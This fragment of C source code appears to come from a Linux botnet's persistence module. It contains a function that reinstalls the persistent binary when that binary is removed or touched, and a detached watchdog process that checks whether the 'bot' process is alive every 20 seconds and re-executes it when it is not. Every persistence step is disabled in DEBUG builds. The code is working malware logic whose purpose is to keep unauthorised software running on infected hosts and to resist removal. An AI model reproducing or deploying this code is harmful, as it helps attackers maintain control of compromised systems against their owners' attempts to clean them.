    
    if (access(persistent, F_OK) != 0) {
        #ifndef DEBUG
        persistence_init();
        #endif
        return;
    }
    
    if (inotify_fd != -1) {
        char buf[4096];
        ssize_t len = read(inotify_fd, buf, sizeof(buf));
        if (len > 0) {
            #ifndef DEBUG
            persistence_init();
            #endif
        }
    }
}

static pid_t watchdog_pid = -1;

static void watchdog_monitor(void) {
    const char *persistent = get_persistent_path();
    if (persistent == NULL)
        return;
    
    pid_t monitor_pid = fork();
    if (monitor_pid < 0)
        return;
    
    if (monitor_pid > 0) {
        watchdog_pid = monitor_pid;
        return;
    }
    
    setsid();
    
    pid_t bot_pid = getppid();
    
    for (int i = 0; i < 1024; i++) {
        close(i);
    }
    
    while (1) {
        sleep(20); 
        
        if (kill(bot_pid, 0) != 0) {
            if (access(persistent, X_OK) == 0) {
                pid_t new_bot = fork();
                if (new_bot == 0) {
                    char *argv[] = {(char *)persistent, NULL};
                    execv(persistent, argv);
                    _exit(1);
                } else if (new_bot > 0) {
                    bot_pid = new_bot;
                }
            } else {
                _exit(0);
            }
        }
    }
}

void persistence_watchdog_start(void) {
    #ifndef DEBUG
    watchdog_monitor();
    #endif
}
